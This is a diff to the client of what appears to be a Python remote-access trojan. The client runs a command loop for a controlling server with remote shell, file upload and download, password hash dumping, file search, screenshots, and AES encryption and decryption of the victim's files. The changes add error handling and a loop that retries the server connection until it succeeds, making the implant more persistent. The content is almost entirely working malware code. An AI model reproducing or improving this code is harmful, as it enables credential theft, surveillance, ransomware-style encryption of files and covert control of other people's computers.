@@ -26,7 +26,7 @@ class Computer:
           err=output.stderr
           out=out+err # concat stdout and stderr
       except Exception as e:
-        out=e
+        out=f"{e}".encode()
       # send output to server, even if it's an error
       # * is separator between prompt and output
       socket.send(b"*".join([self.get_prompt().encode(), out]), as_bytes=True)
@@ -122,6 +122,9 @@ def encrypt(socket):
     aes.encrypt_file(filename)
   elif isdir(filename):
     aes.encrypt_dir(filename)
+  else:
+    socket.send('Not found.')
+    return
   socket.send('done.')
 
 def decrypt(socket):
@@ -132,7 +135,11 @@ def decrypt(socket):
   if isfile(filename):
     aes.decrypt_file(filename)
   elif isdir(filename):
+    print(f"decrypting {filename}")
     aes.decrypt_dir(filename)
+  else:
+    socket.send('Not found.')
+    return
   socket.send('done.')
 
 if __name__ == "__main__":
@@ -153,40 +160,47 @@ if __name__ == "__main__":
       system=Windows()
     case _:
       exit('OS not supported.')
-  
+
   try:
-    socket=Client(host=host)
-  except:
-    exit("Server unreachable.")
-  
-  # list existing commands that can be used on the server
-  using=True
-  while using:
-    match socket.receive():
-      case "ip":
-        socket.send(system.ipconfig())
-      case "shell":
-        system.shell(socket)
-      case "upload":
-        socket.receive_file()
-      case "download":
-        download(socket)
-      case "hashdump":
-        socket.send(system.hashdump())
-      case "search":
-        filename, path = socket.get_params()
-        socket.send(system.search(filename,path))
-      case "screenshot":
-        filename = socket.get_params()
-        cleaned_filename = f'{filename[0]}.png'
-        socket.send_file(system.screenshot(cleaned_filename),cleaned_filename)
-        os.remove(cleaned_filename)
-      case "delete":
-        using=False
-      case "encrypt":
-        encrypt(socket)
-      case "decrypt":
-        decrypt(socket)
-      case _:
+    srv_connected=False
+    while not srv_connected:
+      try:
+        socket=Client(host=host)
+        srv_connected=True
+      except:
         pass
-  socket.disconnect()
+    # list existing commands that can be used on the server
+    using=True
+    while using:
+      match socket.receive():
+        case "ip":
+          socket.send(system.ipconfig())
+        case "shell":
+          system.shell(socket)
+        case "upload":
+          socket.receive_file()
+        case "download":
+          download(socket)
+        case "hashdump":
+          socket.send(system.hashdump())
+        case "search":
+          filename, path = socket.get_params()
+          socket.send(system.search(filename,path))
+        case "screenshot":
+          filename = socket.get_params()
+          cleaned_filename = f'{filename[0]}.png'
+          socket.send_file(system.screenshot(cleaned_filename),cleaned_filename)
+          os.remove(cleaned_filename)
+        case "delete":
+          using=False
+        case "encrypt":
+          encrypt(socket)
+        case "decrypt":
+          decrypt(socket)
+        case _:
+          pass
+    socket.disconnect()
+  except:
+    if srv_connected:
+      socket.send('end')
+      socket.disconnect()
